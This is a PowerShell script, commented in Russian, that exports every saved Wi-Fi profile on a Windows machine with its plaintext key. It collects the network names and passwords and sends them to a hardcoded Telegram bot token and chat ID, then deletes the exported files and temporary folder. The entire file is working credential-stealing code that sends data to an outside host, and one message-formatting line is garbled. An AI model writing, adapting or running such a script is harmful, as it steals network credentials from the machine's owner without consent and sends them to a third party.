# Параметры бота Telegram
$BotToken = "8013680506:AAHzKXQVcb7fE0WYWo_faMCogkHnqPm33ak"  # Замените на ваш токен
$ChatID = "259082534"                                         # Замените на ваш Chat ID

# Создаем временную директорию
$TempDir = "$env:temp\wifi-passwords"
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
Set-Location $TempDir

# Экспортируем профили Wi-Fi
netsh wlan export profile key=clear | Out-Null

# Формируем текстовое сообщение с паролями
$Message = "📶 Сохраненные пароли Wi-Fi:`n`n"

Get-ChildItem -Path "*.xml" | ForEach-Object {
    $XmlData = [xml](Get-Content $_.FullName)
    $SSID = $XmlData.WLANProfile.SSIDConfig.SSID.Name
    $Password = $XmlData.WLANProfile.MSM.Security.SharedKey.KeyMaterial
    $Message += "🔹 **SSID:** $SSID`n"
    $Message += "🔸 **Пароль:** `$Password``$Password``$Password`n`n"
    Remove-Item $_.FullName
}

# Отправляем сообщение в Telegram
$TelegramAPIUrl = "https://api.telegram.org/bot$BotToken/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
    parse_mode = "Markdown"
}

try {
    Invoke-RestMethod -Uri $TelegramAPIUrl -Body $Body -Method Post | Out-Null
    Write-Host "Сообщение успешно отправлено в Telegram."
} catch {
    Write-Host "Ошибка при отправке сообщения: $($_.Exception.Message)"
}

# Удаляем временную директорию
Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
